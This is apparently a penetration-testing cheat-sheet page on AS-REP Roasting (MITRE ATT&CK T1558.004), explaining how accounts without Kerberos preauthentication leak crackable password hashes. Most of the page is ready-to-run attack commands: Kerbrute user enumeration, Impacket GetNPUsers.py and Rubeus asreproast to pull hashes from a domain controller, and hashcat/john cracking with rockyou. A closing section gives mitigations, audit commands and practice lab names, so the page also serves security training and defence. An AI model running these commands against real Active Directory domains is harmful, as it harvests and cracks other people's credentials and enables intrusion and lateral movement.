---
description: https://attack.mitre.org/techniques/T1558/004/
---

# AS-REP Roasting

**ATT\&CK ID:** [T1558.004](https://attack.mitre.org/techniques/T1558/004/)

**Permissions Required:** <mark style="color:green;">**Valid Domain Account**</mark> | <mark style="color:green;">**None**</mark>

**Description**

Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages.

Preauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.

For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials.

An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data.

Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.

AS-REP Roasting takes advantage of Active Directory user accounts that have the option `Do not require Kerberos preauthentication` enabled.

![](<../../../../.gitbook/assets/image (2006).png>)

When this option is enabled we are able to request data from the Active Directory account that is encrypted with the users password. We can take this hash and if successful with cracking, we are able to derive the user accounts password.

## Exploit Techniques (Linux)

### Empire

**URL:** [https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)

```bash
# PowerShell
powershell/credentials/rubeus

# C#
csharp/GhostPack/Rubeus
```

### Kerbrute

**URL:** [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

```bash
./kerbrute userenum <Wordlist> --dc <IP> --domain <Domain>
kerbrute userenum names.txt --dc 10.10.10.10 --domain security.local
```

![](<../../../../.gitbook/assets/image (2007).png>)

### Impacket

**URL:** [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

```bash
# No domain credential, bruteforce names with a wordlist
GetNPUsers.py  <Domain/> -dc-ip <IP> -usersfile <Wordlist> -format hashcat | grep -v 'Kerberos SessionError:'
GetNPUsers.py  security/ -dc-ip 10.10.10.10 -usersfile names.txt -format hashcat | grep -v 'Kerberos SessionError:'

# Valid domain credentials, extract from all domain accounts
GetNPUsers.py <Domain>/<User>:<Password> -request -format john | grep "$krb5asrep$"
GetNPUsers.py  security.local/moe:'Password123' -request -dc-ip 10.10.10.10 -format john | grep "$krb5asrep$"
```

## Exploit Techniques (Windows)

### Rubeus

**URL:** [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

```bash
# Extract from all domain accounts
.\Rubeus.exe asreproast /simple
.\Rubeus.exe asreproast /format:hashcat /outfile:C:Hashes.txt
```

## Cracking

```bash
# Windows
hashcat64.exe -m 18200 c:Hashes.txt rockyou.txt

# Linux
john --wordlist rockyou.txt Hashes.txt
hashcat -m 18200 -a 3 Hashes.txt rockyou.txt
```

![](<../../../../.gitbook/assets/image (2010).png>)

## Mitigation

* Ensure where possible Domain accounts do not have the`Do not require Kerberos preauthentication` option in Active Directory enabled.
* ensure accounts have exceptionally long passwords and are rotated frequently
* If possible use a stronger encryption standard rather than RC4.

Audit accounts for which this option is enabled:

#### PowerShell

```powershell
Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $True -and $_.Enabled -eq $True} | Select-Object 'SamAccountName','DoesNotRequirePreAuth' | Sort-Object 'SamAccountName'
```

#### PowerView

```powershell
Get-DomainUser -PreauthNotRequired -Verbose | select userprincipalname
Get-ASREPHash -UserName '<User>' -Verbose
```

## Labs

{% tabs %}
{% tab title="Spoiler!" %}
```bash
Click the 'Show' tab to reveal lab providers that use this attack vector
```
{% endtab %}

{% tab title="Show" %}
```bash
<TryHackme> # https://tryhackme.com/
VulnNet:Roasted

<HackTheBox> # https://www.hackthebox.eu/
Forest
Sauna

<CyberSecLabs> # https://www.cyberseclabs.co.uk/
Brute
```
{% endtab %}
{% endtabs %}

## References:

* [**https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a**](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
* [**https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/**](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)

***
